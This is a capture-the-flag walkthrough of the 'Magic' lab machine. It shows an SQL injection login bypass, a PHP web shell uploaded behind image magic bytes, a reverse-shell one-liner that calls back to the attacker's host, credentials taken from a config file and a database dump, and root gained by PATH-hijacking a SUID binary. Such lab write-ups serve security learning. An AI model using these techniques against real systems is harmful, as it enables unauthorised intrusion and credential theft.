# Magic
## User
First I did a standard Nmap scan:
```
$ nmap -A -sV 10.10.10.185
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 16:21 CEST
Nmap scan report for 10.10.10.185
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```
We can see there are only 2 open Ports. Since SSH is not interesting at the moment as we don't have any login data we first take a look at the website.
There you can find a few images and a login panel. I decided to try a very simple SQL Injection.
```
Username: admin
Password: ' OR 1=1;--
```
This did not seem to work so I looked at the network traffic and found that the spaces get sanitized out before the request is sent.
```
username=admin&password='OR1=1;--
```
This obviously isn't valid SQL so I just modified  the request and sent it again.
```
username=admin&password=' OR 1=1;--
```
This unlocks a new page where you can select a file and upload it to the server. After uploading an image I could now see it on http://10.10.10.185/index.php or http://10.10.10.185/images/uploads/[FILENAME]. So I tried uploading a PHP-Shell to the Server, but it returns an error.
```
Sorry, only JPG, JPEG & PNG files are allowed.
```
After renaming the PHP-Shell from `shell.php` to `shell.php.png` I got another error.
```
What are you trying to do there?
```
This means the uploaded file not only gets checked for the correct file extension but also the content of the file itself. Fortunately it was possible to trick this check by just adding some magic bytes at the beginning of the shell file.
When I now open http://10.10.10.185/images/uploads/shell.php.png I can execute commands on the server.
```
$ whoami
www-data
```
To upgrade to an interactive shell I first opened a netcat shell and then upgraded it with python.

Attacker: `$ nc -nlvp 1234`

Webshell: `$ php -r '$sock=fsockopen("[MY_IP]",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

Upgrading Shell: `$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

After looking around a bit on the server I found `db.php` which contains the login data for the mysql database.
```
$ cat /var/www/Magic/db.php5:
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```
Since `mysqldump` is installed on this system we can just use that to dump the entire database.
```
$ mysqldump -u theseus -p Magic
$ Password: iamkingtheseus
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```
Using this password I can now login as `theseus` and get the `user.txt` flag.
```
$ su theseus
$ Password: Th3s3usW4sK1ng

$ whoami
theseus
```
## Root
I used [LinEnum.sh](https://github.com/rebootuser/LinEnum) to enumerate the Server and found that the binary `sysinfo` has the SUID bit set. That means we can run it with root permissions. 

To better understand how `sysinfo` works I ran [pspy32](https://github.com/DominicBreuker/pspy) on the server and executed `sysinfo`. 
```
CMD: UID=0    PID=3208   | sysinfo 
CMD: UID=0    PID=3210   | lshw -short 
CMD: UID=0    PID=3214   | sh -c fdisk -l 
CMD: UID=0    PID=3215   | fdisk -l 
CMD: UID=0    PID=3218   | sh -c free -h 
```
Turns out that it uses the `lshw` and `fdisk` binaries, but we can't manipulate them directly as we don't have permission to do so. But since sysinfo doesn't use absolute paths for the binaries I can just make my own `lshw` where ever I want. 

First I added a new folder to the front of my `PATH` so Linux will check there first when looking for binaries and then created the `lshw` file in that folder with the code I want the root to execute.
```
$ PATH=/tmp:$PATH
$ export PATH

$ echo "cat /root/root.txt" > /tmp/lshw
$ chmod +x /tmp/lshw
```
When I now execute `sysinfo` I get the flag.
